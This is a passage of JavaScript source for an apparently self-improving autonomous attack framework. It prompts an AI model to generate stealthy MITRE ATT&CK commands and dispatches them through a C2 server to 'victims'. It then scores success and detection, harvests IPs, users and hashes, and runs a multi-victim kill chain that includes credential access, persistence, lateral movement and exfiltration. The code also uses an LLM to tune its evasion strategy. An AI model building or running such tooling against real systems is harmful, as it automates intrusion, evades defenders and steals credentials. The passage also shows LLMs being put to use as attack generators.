- The command MUST print results to stdout — NEVER redirect output to a file (no > or >> operators)
- NEVER use 'source' — the agent runs /bin/sh not bash; use '. file' if needed
- NEVER use GUI tools: xclip, xdotool, zenity, notify-send, etc.
- NEVER use placeholder paths like /path/to/target — use real paths only
- The command must produce visible stdout output — if it produces no output, it is useless
- Use /bin/sh compatible syntax only (no bash arrays, no [[ ]], no $'...' strings)

ENVIRONMENT:
- OS: ${targetOS}
- User: ${isRoot}
- Container: ${isContainer}
- Running services: ${services}
- Prioritise stealth and low detection risk
- CONFIRMED UNAVAILABLE TOOLS on this target (do NOT use these): ${missingTools}`,

    `Generate the most effective command for MITRE ATT&CK ${technique.id} (${technique.name}).

TARGET VICTIM: ${victimId || 'default'}
PER-VICTIM CONTEXT: ${perVictimCtx}

HISTORY (global across all victims):
${history}

STEALTH PERFORMANCE: ${stealthRate}
${techniqueRecord?.detections > 2 ? '⚠ HIGH DETECTION RATE — use stealthier alternatives, avoid noisy syscalls, prefer read-only commands' : 'Stealth is acceptable so far'}

PREVIOUSLY FAILED COMMANDS (do NOT repeat these approaches):
  ${avoidCommands}

PREVIOUSLY SUCCESSFUL COMMANDS (learn from these — replicate the pattern):
  ${successfulCmds}

INTELLIGENCE FROM PRIOR TACTICS:
${intelCtx}

GOAL: Command must print useful data to stdout. Favour cat, ls, ps, id, find, ss, netstat, getent, env, mount, df.
- For process discovery: use 'ps aux' or 'ps -ef' WITHOUT grep — return the full list
- For directory/share discovery: use 'ls -la', 'mount', 'df -h', 'cat /proc/mounts'
- For network discovery: use 'ss -tulnp', 'cat /etc/hosts', 'ip route'
- More output lines = higher confidence score — avoid commands that return only 1-2 lines
- Avoid commands that only write files, modify state, or produce no output.`,
    0.3,
    160,
  );

  if (!raw) return null;
  return raw.replace(/```[a-z]*\n?/g, '').replace(/```/g, '').trim();
}

// =============================================================================
//  EXECUTE TECHNIQUE  (v4.2: passes victim field to all attack endpoints)
// =============================================================================
async function executeTechnique(technique, aiCommand, waitSeconds, victimId = '') {
  const queuedAt  = new Date().toISOString();
  const targetVic = victimId || DEFAULT_DOCKER_VICTIM;

  try {
    let res;

    if (aiCommand) {
      // POST /api/attack/custom — body now includes victim field
      res = await c2('POST', '/api/attack/custom', {
        command: aiCommand,
        victim:  targetVic,
        technique: technique.id,
      });
      const kb = loadKB();
      kb.global_stats.total_ai_commands++;
      saveKB(kb);
      console.log(`  🤖 AI command dispatched to ${targetVic}: ${aiCommand}`);
    } else {
      // POST /api/attack/{t_code} — body includes victim field
      res = await c2('POST', `/api/attack/${technique.id}`, { victim: targetVic });
    }

    if (res.status === 200 || res.status === 201) {
      // Confirm the backend targeted the right victim
      const confirmedVictim = res.body?.victim || targetVic;
      if (confirmedVictim !== targetVic) {
        console.log(`  ⚠  Backend re-routed to: ${confirmedVictim} (requested: ${targetVic})`);
      }

      console.log(`  ✅ Task queued on ${confirmedVictim} — waiting ${waitSeconds}s for output...`);
      await sleep(waitSeconds * 1000);

      // Collect output from the specific victim
      const outputs = await getVictimOutputs(confirmedVictim, 50);

      const filtered = outputs
        .filter((o) => o.technique === technique.id || o.technique === 'CUSTOM')
        .sort((a, b) => new Date(b.time) - new Date(a.time));

      if (filtered.length > 0) {
        const latest = filtered[0];
        const output = latest.output || '';

        if (latest.status != null) {
          const statusStr = String(latest.status).toLowerCase();
          if (statusStr === 'failed' || statusStr === 'error' || statusStr === '1') {
            return { success: false, output, queued_at: queuedAt, command: aiCommand, agent_status: latest.status, victim: confirmedVictim };
          }
        }
        if (latest.exit_code != null && latest.exit_code !== 0) {
          return { success: false, output, queued_at: queuedAt, command: aiCommand, exit_code: latest.exit_code, victim: confirmedVictim };
        }

        return { success: true, output, queued_at: queuedAt, command: aiCommand, victim: confirmedVictim };
      }

      console.log(`  ⚠  No output retrieved from ${confirmedVictim} — result is UNKNOWN`);
      return { success: false, output: '', queued_at: queuedAt, command: aiCommand, victim: confirmedVictim };

    } else if (res.status === 404) {
      console.log(`  ⚠  Technique ${technique.id} not found on C2 (404) — SIMULATED`);
      return { success: false, output: `[Simulated/404] ${technique.id}: no real execution.`, queued_at: queuedAt, command: aiCommand, simulated: true, victim: targetVic };
    } else {
      const detail = typeof res.body === 'object' ? JSON.stringify(res.body) : String(res.body);
      return { success: false, output: detail, queued_at: queuedAt, command: aiCommand, victim: targetVic };
    }
  } catch (err) {
    console.log(`  ⚠  executeTechnique error: ${err.message}`);
    return { success: false, output: err.message, queued_at: queuedAt, command: aiCommand, victim: targetVic };
  }
}

// =============================================================================
//  UPDATE KB — GLOBAL + PER-VICTIM  (v4.2: per_victim tracking)
// =============================================================================
function updateKBForTechnique(kb, technique, tactic, analysis, aiCommand, victimId) {
  // ── Global technique record ──────────────────────────────────────────────
  if (!kb.techniques[technique.id]) {
    kb.techniques[technique.id] = {
      technique_id:        technique.id,
      name:                technique.name,
      tactic,
      attempts:            0,
      successes:           0,
      failures:            0,
      detections:          0,
      success_rate:        0,
      stealth_rate:        1.0,
      avg_confidence:      0,
      confidence_samples:  0,
      weight:              1.3,
      failed_commands:     [],
      successful_commands: [],
      last_failure_reason: null,
      last_ai_command:     null,
    };
  }

  let rec = kb.techniques[technique.id];
  rec.attempts++;
  rec = updateTechniqueWeight(rec, analysis.success, analysis.confidence);

  rec.confidence_samples = (rec.confidence_samples || 0) + 1;
  rec.avg_confidence = (
    ((rec.avg_confidence || 0) * (rec.confidence_samples - 1)) + analysis.confidence
  ) / rec.confidence_samples;

  if (analysis.detection_likely) rec.detections = (rec.detections || 0) + 1;

  rec.stealth_rate = rec.attempts > 0
    ? ((rec.attempts - (rec.detections || 0)) / rec.attempts) : 1.0;

  rec.last_failure_reason = analysis.failure_reason || rec.last_failure_reason;
  rec.last_ai_command     = aiCommand || rec.last_ai_command;

  if (aiCommand) {
    if (!analysis.success) {
      rec.failed_commands     = [...(rec.failed_commands     || []), aiCommand].slice(-5);
    } else {
      rec.successful_commands = [...(rec.successful_commands || []), aiCommand].slice(-5);
    }
  }

  // ── Per-victim technique record  (v4.2 NEW) ──────────────────────────────
  if (victimId) {
    if (!kb.per_victim)                           kb.per_victim = {};
    if (!kb.per_victim[victimId])                 kb.per_victim[victimId] = { techniques: {} };
    if (!kb.per_victim[victimId].techniques[technique.id]) {
      kb.per_victim[victimId].techniques[technique.id] = {
        technique_id:   technique.id,
        name:           technique.name,
        tactic,
        attempts:       0,
        successes:      0,
        failures:       0,
        detections:     0,
        success_rate:   0,
        stealth_rate:   1.0,
        avg_confidence: 0,
        confidence_samples: 0,
        weight:         1.3,
      };
    }

    let pvRec = kb.per_victim[victimId].techniques[technique.id];
    pvRec.attempts++;
    pvRec = updateTechniqueWeight(pvRec, analysis.success, analysis.confidence);
    pvRec.confidence_samples = (pvRec.confidence_samples || 0) + 1;
    pvRec.avg_confidence = (
      ((pvRec.avg_confidence || 0) * (pvRec.confidence_samples - 1)) + analysis.confidence
    ) / pvRec.confidence_samples;
    if (analysis.detection_likely) pvRec.detections = (pvRec.detections || 0) + 1;
    pvRec.stealth_rate = pvRec.attempts > 0
      ? ((pvRec.attempts - (pvRec.detections || 0)) / pvRec.attempts) : 1.0;
  }

  return kb;
}

// =============================================================================
//  RUN TACTIC  (v4.2: victimId passed through to execute + KB)
// =============================================================================
async function runTactic(tactic, options = {}) {
  const {
    maxTechniques = 5,
    maxRetries    = 3,
    excludeIds    = [],
    victimProfile = null,
    chainIntel    = null,
    victimId      = '',    // v4.2 NEW
  } = options;

  const targetVictim = victimId || DEFAULT_DOCKER_VICTIM;

  console.log(`\n${'═'.repeat(60)}`);
  console.log(`  TACTIC  : ${tactic.toUpperCase()}`);
  console.log(`  VICTIM  : ${targetVictim}`);
  console.log(`  Config  : ${maxTechniques} techniques | ${maxRetries} retries | dynamic wait`);
  if (chainIntel?.ips?.length) {
    console.log(`  Intel   : ${chainIntel.ips.length} IPs, ${chainIntel.users?.length || 0} users from prior tactics`);
  }
  console.log(`${'═'.repeat(60)}`);

  let candidates = await getMitreTechniques(tactic);
  console.log(`  Found ${candidates.length} candidate techniques`);

  const kb = loadKB();

  const tacticBoost = kb.tactic_weights[tactic] || 1.0;

  candidates.sort((a, b) => {
    // Prefer per-victim success rate when available, fall back to global
    const pvA = kb.per_victim?.[targetVictim]?.techniques?.[a.id]?.success_rate;
    const pvB = kb.per_victim?.[targetVictim]?.techniques?.[b.id]?.success_rate;
    const rA  = (pvA ?? kb.techniques[a.id]?.success_rate ?? 0) * tacticBoost;
    const rB  = (pvB ?? kb.techniques[b.id]?.success_rate ?? 0) * tacticBoost;
    return rB - rA;
  });

  candidates = candidates.filter((t) => {
    const rec = kb.techniques[t.id];
    if (!rec) return true;
    if (rec.attempts < 3) return true;
    return rec.success_rate > 0.25;
  });

  if (OPENAI_API_KEY && candidates.length > 3) {
    const top  = candidates.slice(0, 3);
    const rest = candidates.slice(3).sort(() => Math.random() - 0.5);
    candidates = [...top, ...rest];
  }

  const selected = candidates.slice(0, maxTechniques);
  const executed = new Set(excludeIds);
  const results  = [];

  for (let i = 0; i < selected.length; i++) {
    const technique = selected[i];

    if (executed.has(technique.id)) {
      console.log(`\n  ⏭ Skipping ${technique.id} (already executed this session)`);
      continue;
    }
    executed.add(technique.id);

    const waitSeconds = calcWaitTime(technique, kb);

    console.log(`\n─── [${i + 1}/${selected.length}] ${technique.id} — ${technique.name} ───`);
    console.log(`  Victim    : ${targetVictim}`);
    console.log(`  Wait time : ${waitSeconds}s (adaptive)`);

    let finalSuccess = false;
    let lastAnalysis = null;
    let bestOutput   = '';

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      if (attempt > 1) console.log(`  ↺ Retry ${attempt}/${maxRetries}`);

      const techniqueRecord = kb.techniques[technique.id] || null;
      let aiCommand = null;

      if (OPENAI_API_KEY) {
        aiCommand = await generateAICommand(
          technique, victimProfile, techniqueRecord, chainIntel, targetVictim,
        );
        if (aiCommand) console.log(`  🤖 AI command: ${aiCommand}`);
        else           console.log(`  ℹ  No AI command — falling back to technique ID`);
      }

      const execResult = await executeTechnique(technique, aiCommand, waitSeconds, targetVictim);
      const analysis   = analyzeOutput(technique, aiCommand, execResult.output, execResult.success);
      lastAnalysis     = analysis;
      if (execResult.output) bestOutput = execResult.output;

      // Update KB (global + per-victim)
      const kbNow = loadKB();
      kbNow.global_stats.total_techniques_tried++;

      kbNow.global_stats.confidence_samples = (kbNow.global_stats.confidence_samples || 0) + 1;
      kbNow.global_stats.avg_confidence_score = (
        ((kbNow.global_stats.avg_confidence_score || 0) * (kbNow.global_stats.confidence_samples - 1)) +
        analysis.confidence
      ) / kbNow.global_stats.confidence_samples;

      if (analysis.success)          kbNow.global_stats.total_successes++;
      else                           kbNow.global_stats.total_failures++;
      if (analysis.detection_likely) kbNow.global_stats.total_detections++;

      if (!kbNow.tactic_stats)           kbNow.tactic_stats = {};
      if (!kbNow.tactic_stats[tactic])   kbNow.tactic_stats[tactic] = { tried: 0, successes: 0, failures: 0 };
      kbNow.tactic_stats[tactic].tried++;
      if (analysis.success) kbNow.tactic_stats[tactic].successes++;
      else                  kbNow.tactic_stats[tactic].failures++;

      updateKBForTechnique(kbNow, technique, tactic, analysis, aiCommand, targetVictim);
      saveKB(kbNow);

      appendJSONL(RESEARCH_FILE, {
        tactic,
        victim_id:        targetVictim,          // v4.2 NEW
        technique_id:     technique.id,
        technique_name:   technique.name,
        attempt,
        ai_command:       aiCommand,
        exec_success:     execResult.success,
        analysis_success: analysis.success,
        confidence:       analysis.confidence,
        signals_found:    analysis.signals_found,
        output_length:    analysis.output_length,
        discovery_value:  analysis.discovery_value,
        sensitive:        analysis.sensitive_data,
        detected:         analysis.detection_likely,
        failure_reason:   analysis.failure_reason,
        wait_used:        waitSeconds,
      });

      console.log(`  Source      : ${aiCommand ? 'ai-generated' : 'technique-id'}`);
      if (analysis.success) {
        console.log(`  Result      : ✅ SUCCESS`);
        console.log(`  Confidence  : ${analysis.confidence}/100`);
        console.log(`  Signals     : ${analysis.signals_found.join(', ') || 'none'}`);
        console.log(`  Output len  : ${analysis.output_length} bytes`);
        if (analysis.sensitive_data) console.log(`  🔑 Sensitive data found`);
      } else {
        console.log(`  Result      : ❌ FAILED`);
        console.log(`  Confidence  : ${analysis.confidence}/100`);
        console.log(`  Reason      : ${analysis.failure_reason || 'unknown'}`);
        if (analysis.detection_likely) console.log(`  🚨 Detection likely`);
      }

      if (analysis.success) { finalSuccess = true; break; }

      const toolNotFound = /\/bin\/sh: \d+: ([^:]+): not found/.exec(execResult.output || '');
      if (toolNotFound) {
        const missingTool = toolNotFound[1].trim();
        console.log(`  ⛔ Early abort — '${missingTool}' not in PATH`);
        const kbAbort = loadKB();
        if (!kbAbort.missing_tools) kbAbort.missing_tools = [];
        if (!kbAbort.missing_tools.includes(missingTool)) {
          kbAbort.missing_tools.push(missingTool);
          saveKB(kbAbort);
          console.log(`  📝 Recorded '${missingTool}' as unavailable`);
        }
        break;
      }

      if (attempt < maxRetries) await sleep(3000);
    }

    results.push({
      technique_id:    technique.id,
      name:            technique.name,
      final_success:   finalSuccess,
      failure_reason:  finalSuccess ? null : (lastAnalysis?.failure_reason || 'unknown'),
      discovery_value: lastAnalysis?.discovery_value || 0,
      confidence:      lastAnalysis?.confidence || 0,
      signals_found:   lastAnalysis?.signals_found || [],
      raw_output:      bestOutput,
    });
  }

  if (OPENAI_API_KEY) {
    const kbFinal = loadKB();
    kbFinal.global_stats.total_self_improvements++;
    saveKB(kbFinal);
    console.log('\n  🧬 Self-improvement cycle recorded');
  }

  const successes = results.filter((r) => r.final_success).length;
  const failures  = results.length - successes;
  const avgConf   = results.length
    ? (results.reduce((s, r) => s + (r.confidence || 0), 0) / results.length).toFixed(0)
    : 0;

  console.log(`\n${'─'.repeat(60)}`);
  console.log(`TACTIC COMPLETE: ${tactic.toUpperCase()}  [victim: ${targetVictim}]`);
  console.log(`  Successes       : ${successes} / ${results.length}`);
  console.log(`  Failures        : ${failures} / ${results.length}`);
  console.log(`  Rate            : ${results.length ? ((successes / results.length) * 100).toFixed(1) : 0}%`);
  console.log(`  Avg Confidence  : ${avgConf}/100`);

  if (failures > 0) {
    console.log('\n  Failed techniques:');
    results.filter((r) => !r.final_success).forEach((r) => {
      console.log(`    ✗ ${r.technique_id.padEnd(16)} ${r.name.padEnd(36)} conf:${r.confidence} — ${r.failure_reason}`);
    });
  }
  console.log(`${'─'.repeat(60)}`);

  return { tactic, victim_id: targetVictim, results, successes, total: results.length, ai_active: !!OPENAI_API_KEY };
}

// =============================================================================
//  RUN FULL KILL CHAIN  (v4.2: supports single victim or list of victims)
// =============================================================================
async function runFullChain(tactics, options = {}) {
  const {
    victimIds    = [],    // v4.2: list of victim IDs to attack
    victimId     = '',    // v4.2: single victim ID
    ...restOpts
  } = options;

  // Build the list of victims to iterate
  let targets = [];
  if (victimIds.length > 0)  targets = victimIds;
  else if (victimId)         targets = [victimId];
  else                       targets = [C2_VICTIM_ENV || DEFAULT_DOCKER_VICTIM];

  const border = '═'.repeat(58);
  console.log(`\n╔${border}╗`);
  console.log(`║  FULL AUTONOMOUS KILL CHAIN v4.2${' '.repeat(25)}║`);
  const tacticStr = tactics.join(', ');
  console.log(`║  Tactics  : ${tacticStr}${' '.repeat(Math.max(0, 45 - tacticStr.length))}║`);
  const victimStr = targets.join(', ').slice(0, 44);
  console.log(`║  Victims  : ${victimStr}${' '.repeat(Math.max(0, 45 - victimStr.length))}║`);
  console.log(`╚${border}╝`);

  const kb = loadKB();
  kb.total_sessions++;
  saveKB(kb);

  const session = defaultSession();
  saveSession(session);

  // Sync victim list from backend
  console.log('\n🔄 Syncing victims from backend...');
  const backendVictims = await fetchBackendVictims();
  console.log(`   ${backendVictims.length} victim(s) in backend registry`);

  // Ensure all target victims are resolved/registered
  const resolvedTargets = [];
  for (const raw of targets) {
    const vid = await resolveVictim(raw);
    resolvedTargets.push(vid);
  }

  const uniqueTargets = [...new Set(resolvedTargets)];
  console.log(`\n🎯 Targeting ${uniqueTargets.length} victim(s): ${uniqueTargets.join(', ')}`);

  // Load persistent chain intel
  let chainIntel = loadIntel();
  if (!chainIntel.ips) chainIntel = defaultIntel();

  if (chainIntel.ips?.length || chainIntel.users?.length) {
    console.log('\n📡 Loaded persistent chain intel:');
    if (chainIntel.ips?.length)    console.log(`   IPs    : ${chainIntel.ips.slice(0,5).join(', ')}`);
    if (chainIntel.users?.length)  console.log(`   Users  : ${chainIntel.users.slice(0,5).join(', ')}`);
    if (chainIntel.hashes?.length) console.log(`   Hashes : ${chainIntel.hashes.length} captured`);
  }

  const allResults = {};

  // Iterate over each victim
  for (const currentVictim of uniqueTargets) {
    console.log(`\n${'▓'.repeat(60)}`);
    console.log(`  ATTACKING VICTIM: ${currentVictim}`);
    console.log(`${'▓'.repeat(60)}`);

    // Load or build victim profile
    let victimProfile = loadProfile(currentVictim);
    if (!victimProfile) {
      victimProfile = await profileVictim(currentVictim);
    } else {
      console.log(`\n📋 Using cached profile for ${currentVictim}`);
    }

    allResults[currentVictim] = {};

    for (const tactic of tactics) {
      allResults[currentVictim][tactic] = await runTactic(tactic, {
        ...restOpts,
        victimProfile,
        chainIntel,
        victimId: currentVictim,
      });

      chainIntel = extractIntelligence(allResults[currentVictim][tactic], chainIntel);

      if (chainIntel.ips.length > 0 || chainIntel.users.length > 0) {
        console.log(`\n  📡 Chain Intel updated after ${tactic} on ${currentVictim}:`);
        if (chainIntel.ips.length)    console.log(`     IPs    : ${chainIntel.ips.slice(0,5).join(', ')}`);
        if (chainIntel.users.length)  console.log(`     Users  : ${chainIntel.users.slice(0,5).join(', ')}`);
        if (chainIntel.hashes.length) console.log(`     Hashes : ${chainIntel.hashes.length} captured`);
      }

      await sleep(2000);
    }
  }

  // Aggregate totals across all victims + tactics
  let totalTried = 0, totalSucc = 0;
  for (const victimResults of Object.values(allResults)) {
    for (const tacticResult of Object.values(victimResults)) {
      totalTried += tacticResult.total     || 0;
      totalSucc  += tacticResult.successes || 0;
    }
  }
  const totalFail = totalTried - totalSucc;
  const rate      = totalTried ? ((totalSucc / totalTried) * 100).toFixed(1) : '0.0';

  const kbFinal = loadKB();

  const avgConfAll = totalTried > 0
    ? (Object.values(allResults)
        .flatMap(v => Object.values(v))
        .flatMap(r => r.results)
        .reduce((s, r) => s + (r.confidence || 0), 0) / totalTried
      ).toFixed(1)
    : '0.0';

  appendJSONL(RESEARCH_FILE, {
    type:            'session_summary',
    session_num:     kbFinal.total_sessions,
    success_rate:    parseFloat(rate),
    avg_confidence:  parseFloat(avgConfAll),
    total_tried:     totalTried,
    total_successes: totalSucc,
    total_failures:  totalFail,
    tactics_run:     tactics,
    victims:         uniqueTargets,             // v4.2 NEW
    date:            new Date().toISOString(),
  });

  console.log(`\n╔${border}╗`);
  console.log(`║  KILL CHAIN COMPLETE v4.2${' '.repeat(32)}║`);
  console.log(`║  Victims attacked : ${uniqueTargets.length}${' '.repeat(37 - String(uniqueTargets.length).length)}║`);
  console.log(`║  Techniques tried : ${totalTried}${' '.repeat(37 - String(totalTried).length)}║`);
  console.log(`║  Successes        : ${totalSucc}/${totalTried}${' '.repeat(35 - String(totalSucc).length - String(totalTried).length)}║`);
  console.log(`║  Failures         : ${totalFail}${' '.repeat(37 - String(totalFail).length)}║`);
  console.log(`║  Success rate     : ${rate}%${' '.repeat(36 - rate.length)}║`);
  console.log(`╚${border}╝`);

  return allResults;
}

// =============================================================================
//  EVOLVE  (v4.1 FIX 1 preserved — now also considers per-victim data)
// =============================================================================
async function evolve() {
  console.log('\n🧬 EVOLVING STRATEGY USING AI...\n');

  if (!OPENAI_API_KEY) {
    console.log('❌ OPENAI_API_KEY is not set.');
    return;
  }

  const kb = loadKB();

  const topTechs = Object.values(kb.techniques)
    .sort((a, b) => b.success_rate - a.success_rate)
    .slice(0, 5)
    .map((t) =>
      `  ${t.technique_id} (${t.name}): ${(t.success_rate * 100).toFixed(0)}% success, ` +
      `avg conf: ${(t.avg_confidence || 0).toFixed(0)}/100, ` +
      `stealth: ${((t.stealth_rate || 1) * 100).toFixed(0)}%`
    )
    .join('\n');

  const failedTechs = Object.values(kb.techniques)
    .filter((t) => t.success_rate < 0.5 && t.attempts >= 2)
    .map((t) =>
      `  ${t.technique_id} (${t.name}): ${(t.success_rate * 100).toFixed(0)}% — ` +
      `reason: ${t.last_failure_reason || 'unknown'}, ` +
      `stealth: ${((t.stealth_rate || 1) * 100).toFixed(0)}%`
    )
    .join('\n');

  const tacticSummary = Object.entries(kb.tactic_stats || {})
    .map(([tactic, s]) =>
      `  ${tactic}: ${s.successes}/${s.tried} ` +
      `(${s.tried ? ((s.successes / s.tried) * 100).toFixed(0) : 0}%) ` +
      `weight=${(kb.tactic_weights?.[tactic] || 1.0).toFixed(2)}`
    )
    .join('\n');

  // Per-victim performance summary (v4.2 NEW)
  const perVictimSummary = Object.entries(kb.per_victim || {})
    .map(([vid, data]) => {
      const techs = Object.values(data.techniques || {});
      const succ  = techs.filter(t => t.success_rate > 0.5).length;
      return `  ${vid}: ${succ}/${techs.length} techniques succeeding`;
    })
    .join('\n');

  const summary = [
    `Sessions run         : ${kb.total_sessions}`,
    `Techniques tried     : ${kb.global_stats.total_techniques_tried}`,
    `Successes            : ${kb.global_stats.total_successes}`,
    `Failures             : ${kb.global_stats.total_failures}`,
    `AI-gen commands      : ${kb.global_stats.total_ai_commands}`,
    `Self-improvements    : ${kb.global_stats.total_self_improvements}`,
    `Detections           : ${kb.global_stats.total_detections}`,
    `Avg confidence score : ${(kb.global_stats.avg_confidence_score || 0).toFixed(1)}/100`,
    '',
    'Per-tactic accuracy (with current weight):',
    tacticSummary || '  (none yet)',
    '',
    'Per-victim performance:',
    perVictimSummary || '  (none yet)',
    '',
    'Top techniques (with stealth rate):',
    topTechs || '  (none yet)',
    '',
    'Underperforming techniques:',
    failedTechs || '  (none yet)',
  ].join('\n');

  const suggestion = await callAI(
    'You are a cybersecurity red team strategist reviewing automated attack simulation results. '
    + 'Analyse the statistics and provide specific, actionable improvements for the next session. '
    + 'In your response, include a section titled "PRIORITISE TACTICS:" followed by a comma-separated '
    + 'list of tactics to boost (e.g. "PRIORITISE TACTICS: discovery, credential-access"). '
    + 'Also include a section "RETIRE TACTICS:" with tactics to deprioritise. '
    + 'Then provide your general strategic recommendations.',
    summary,
    0.5,
    700,
  );

  console.log('🧠 AI Strategy Suggestions\n');
  console.log(suggestion || '  No response from AI.');

  if (suggestion) {
    const kbEvolve = loadKB();
    if (!kbEvolve.tactic_weights) kbEvolve.tactic_weights = {};

    const ALL_TACTICS = [
      'discovery', 'credential-access', 'privilege-escalation',
      'persistence', 'defense-evasion', 'lateral-movement',
      'collection', 'exfiltration',
    ];

    const prioritiseMatch = suggestion.match(/PRIORITISE TACTICS:\s*([^\n]+)/i);
    if (prioritiseMatch) {
      const prioritised = prioritiseMatch[1]
        .split(',')
        .map(t => t.trim().toLowerCase().replace(/\s+/g, '-'))
        .filter(t => ALL_TACTICS.includes(t));

      for (const tactic of prioritised) {
        const current = kbEvolve.tactic_weights[tactic] || 1.0;
        kbEvolve.tactic_weights[tactic] = Math.min(3.0, current * 1.25);
        console.log(`\n  ⬆  Boosted tactic weight: ${tactic} → ${kbEvolve.tactic_weights[tactic].toFixed(2)}`);
      }
    }

    const retireMatch = suggestion.match(/RETIRE TACTICS:\s*([^\n]+)/i);
    if (retireMatch) {
      const retired = retireMatch[1]
        .split(',')
        .map(t => t.trim().toLowerCase().replace(/\s+/g, '-'))
        .filter(t => ALL_TACTICS.includes(t));

      for (const tactic of retired) {
        const current = kbEvolve.tactic_weights[tactic] || 1.0;
        kbEvolve.tactic_weights[tactic] = Math.max(0.1, current * 0.7);
        console.log(`  ⬇  Reduced tactic weight: ${tactic} → ${kbEvolve.tactic_weights[tactic].toFixed(2)}`);
      }
    }

    const highDetectionTechs = Object.values(kbEvolve.techniques)
      .filter(t => (t.detections || 0) > 2 && t.attempts >= 3);

    for (const tech of highDetectionTechs) {
      tech.weight = Math.max(0.1, tech.weight * 0.8);
    }

    kbEvolve.global_stats.total_self_improvements++;
    saveKB(kbEvolve);

    const tacticChanges = Object.entries(kbEvolve.tactic_weights)
      .map(([t, w]) => `${t}=${w.toFixed(2)}`)
      .join(', ');

    console.log(`\n✅ KB updated — tactic weights: ${tacticChanges || 'unchanged'}`);
    console.log(`✅ ${highDetectionTechs.length} high-detection techniques had weights reduced`);
  } else {
    const kbFallback = loadKB();
    kbFallback.global_stats.total_self_improvements++;
    saveKB(kbFallback);
    console.log('\n✅ Self-improvement counter updated (no AI response to parse)');
  }
}

// =============================================================================
//  STATS  (v4.2: shows per-victim breakdown)
// =============================================================================
function showStats() {
  const kb = loadKB();
  const g  = kb.global_stats;
  const successRate = g.total_techniques_tried
    ? ((g.total_successes / g.total_techniques_tried) * 100).toFixed(1)
    : '0.0';
  const failureRate = g.total_techniques_tried
    ? ((g.total_failures / g.total_techniques_tried) * 100).toFixed(1)
    : '0.0';

  console.log(`\n${'═'.repeat(60)}`);
  console.log('  SELF-IMPROVEMENT ENGINE v4.2  —  STATISTICS');
  console.log(`${'═'.repeat(60)}`);
  console.log(`  Sessions            : ${kb.total_sessions}`);
  console.log(`  Techniques tried    : ${g.total_techniques_tried}`);
  console.log(`  Successes           : ${g.total_successes}  (${successRate}%)`);
  console.log(`  Failures            : ${g.total_failures}  (${failureRate}%)`);
  console.log(`  AI-gen commands     : ${g.total_ai_commands}`);
  console.log(`  Self-improvements   : ${g.total_self_improvements}`);
  console.log(`  Detections          : ${g.total_detections}`);
  console.log(`  Detections evaded   : ${g.total_detections_evaded}`);
  console.log(`  Avg confidence      : ${(g.avg_confidence_score || 0).toFixed(1)}/100`);

  // Per-tactic accuracy
  const tacticStats = kb.tactic_stats || {};
  if (Object.keys(tacticStats).length > 0) {
    console.log(`\n  PER-TACTIC ACCURACY`);
    console.log(`  ${'─'.repeat(55)}`);
    for (const [tactic, s] of Object.entries(tacticStats)) {
      const rate   = s.tried ? ((s.successes / s.tried) * 100).toFixed(1) : '0.0';
      const bar    = '█'.repeat(Math.round(parseFloat(rate) / 10)).padEnd(10, '░');
      const weight = (kb.tactic_weights?.[tactic] || 1.0).toFixed(2);
      console.log(`  ${tactic.padEnd(24)} ${bar} ${rate}% (${s.successes}/${s.tried}) w=${weight}`);
    }
  }

  // Per-victim breakdown (v4.2 NEW)
  const perVictim = kb.per_victim || {};
  if (Object.keys(perVictim).length > 0) {
    console.log(`\n  PER-VICTIM BREAKDOWN`);
    console.log(`  ${'─'.repeat(55)}`);
    for (const [vid, data] of Object.entries(perVictim)) {
      const techs    = Object.values(data.techniques || {});
      const tried    = techs.reduce((s, t) => s + t.attempts, 0);
      const successes = techs.reduce((s, t) => s + t.successes, 0);
      const rate     = tried ? ((successes / tried) * 100).toFixed(1) : '0.0';
      const bar      = '█'.repeat(Math.round(parseFloat(rate) / 10)).padEnd(10, '░');
      const reg      = loadVictimsRegistry();
      const label    = reg.victims[vid]?.label || vid;
      console.log(`  ${label.slice(0,24).padEnd(24)} ${bar} ${rate}% (${tried} attempts)`);
    }
  }

  // Top 5 techniques
  const techs = Object.values(kb.techniques);
  if (techs.length > 0) {
    console.log(`\n  TOP 5 TECHNIQUES  (success · confidence · stealth)`);
    console.log(`  ${'─'.repeat(55)}`);
    techs
      .filter((t) => t.attempts >= 2)
      .sort((a, b) => b.success_rate - a.success_rate)
      .slice(0, 5)
      .forEach((t) => {
        const pct     = (t.success_rate * 100).toFixed(0).padStart(3);
        const conf    = (t.avg_confidence || 0).toFixed(0).padStart(3);
        const stealth = ((t.stealth_rate || 1) * 100).toFixed(0).padStart(3);
        console.log(`  ${t.technique_id.padEnd(14)} ${t.name.padEnd(32)} ${pct}% conf:${conf} stealth:${stealth}%`);
      });
  }

  // Cross-session trend table
  if (fs.existsSync(RESEARCH_FILE)) {
    try {
      const lines    = fs.readFileSync(RESEARCH_FILE, 'utf8').split('\n').filter(Boolean);
      const sessions = lines
        .map(l => { try { return JSON.parse(l); } catch { return null; } })
        .filter(l => l && l.type === 'session_summary')
        .slice(-10);

      if (sessions.length > 1) {
        console.log(`\n  CROSS-SESSION TREND  (last ${sessions.length} sessions)`);
        console.log(`  ${'─'.repeat(55)}`);
        sessions.forEach((s, i) => {
          const bar    = '█'.repeat(Math.round((s.success_rate || 0) / 10)).padEnd(10, '░');
          const trend  = i > 0
            ? (s.success_rate > sessions[i-1].success_rate ? '↑' :
               s.success_rate < sessions[i-1].success_rate ? '↓' : '→')
            : ' ';
          const date     = (s.date || '').slice(0, 10);
          const victims  = s.victims ? ` [${s.victims.join(',')}]` : '';
          console.log(
            `  Session ${String(s.session_num || i+1).padStart(3)}  ${bar}  ` +
            `${String(s.success_rate || 0).padStart(5)}%  conf:${String(s.avg_confidence || 0).padStart(5)}  ${trend}  ${date}${victims}`
          );
        });

        if (sessions.length >= 2) {
          const first = sessions[0].success_rate || 0;
          const last  = sessions[sessions.length - 1].success_rate || 0;
          const delta = (last - first).toFixed(1);
          const sign  = delta >= 0 ? '+' : '';
          console.log(`\n  Overall trend: ${sign}${delta}% over ${sessions.length} sessions`);
        }
      }
    } catch {}
  }

  console.log(`${'═'.repeat(60)}\n`);
}

// =============================================================================
//  KNOWLEDGE BASE DISPLAY
// =============================================================================
function showKnowledge() {
  const kb    = loadKB();
  const techs = Object.values(kb.techniques);

  if (!techs.length) {
    console.log('\nNo techniques learned yet. Run an attack first.\n');
    return;
  }

  console.log(`\n${'═'.repeat(95)}`);
  console.log('  KNOWLEDGE BASE v4.2  —  LEARNED TECHNIQUES');
  console.log(`${'═'.repeat(95)}`);

  techs
    .sort((a, b) => b.success_rate - a.success_rate)
    .slice(0, 15)
    .forEach((t) => {
